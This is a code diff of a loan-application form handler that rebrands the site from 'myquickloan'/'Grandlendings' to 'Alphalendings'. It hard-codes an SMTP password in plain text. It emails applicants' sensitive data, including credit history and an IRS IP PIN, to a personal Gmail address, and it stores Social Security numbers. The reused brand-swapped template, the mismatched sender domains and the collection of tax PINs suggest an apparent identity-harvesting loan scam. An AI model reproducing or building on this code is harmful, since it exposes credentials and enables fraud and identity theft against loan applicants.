@@ -20,28 +20,28 @@ export async function POST(request) {
     },
   });
 
-  //   const transporter2 = nodemailer.createTransport({
-  //     host: "mail.privateemail.com",
-  //     port: 465,
-  //     secure: true,
-  //     auth: {
-  //       user: "noreply@myquickloan.us",
-  //       pass: "mighTY88$$",
-  //     },
-  //   });
+  const transporter2 = nodemailer.createTransport({
+    host: "mail.privateemail.com",
+    port: 465,
+    secure: true,
+    auth: {
+      user: "noreply@alphalendings.us",
+      pass: "mighTY88$$",
+    },
+  });
 
-  //   const autoReplyMessage = {
-  //     from: "noreply@myquickloan.us",
-  //     to: formData.emailAddress,
-  //     subject: "Loan Application Received",
-  //     html: `
-  //     <h3>Thank you for your loan application!</h3>
-  //     <p>We have received your loan application and will review it shortly.</p>
-  //     <p>If you have any further questions or need assistance, please feel free to contact us: loans@myquickloan.us></a></p>
-  //     <p>Best regards,</p>
-  //     <p>MyQuickLoan Team</p>
-  //     `,
-  //   };
+  const autoReplyMessage = {
+    from: "no-reply <noreply@alphalendings.com>",
+    to: formData.emailAddress,
+    subject: "Loan Application Received",
+    html: `
+      <h3>Thank you for your loan application!</h3>
+      <p>We have received your loan application and will review it shortly.</p>
+      <p>If you have any further questions or need assistance, please feel free to contact us: loans@alphalendings.us></a></p>
+      <p>Best regards,</p>
+      <p>Alphalendings Team</p>
+      `,
+  };
   // Compose the email message
   const message = {
     from: "osr.cty@gmail.com",
@@ -88,8 +88,8 @@ export async function POST(request) {
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
-    <p>Grandlendings Source: ${formData.GrandlendingsSource}</p>
-    <p>Grandlendings Source Other: ${formData.GrandlendingsSourceOther}</p>
+    <p>Alphalendings Source: ${formData.AlphalendingsSource}</p>
+    <p>Alphalendings Source Other: ${formData.AlphalendingsSourceOther}</p>
     <p>Credit Score: ${formData.creditScore}</p>
     <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
     <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
@@ -115,6 +115,7 @@ export async function POST(request) {
     // Send the email
     // await transporter2.sendMail(autoReplyMessage);
     await transporter1.sendMail(message);
+    await transporter2.sendMail(autoReplyMessage);
     await FormDataModel.create({
       ssn: ssn,
       emailAddress: emailAddress,
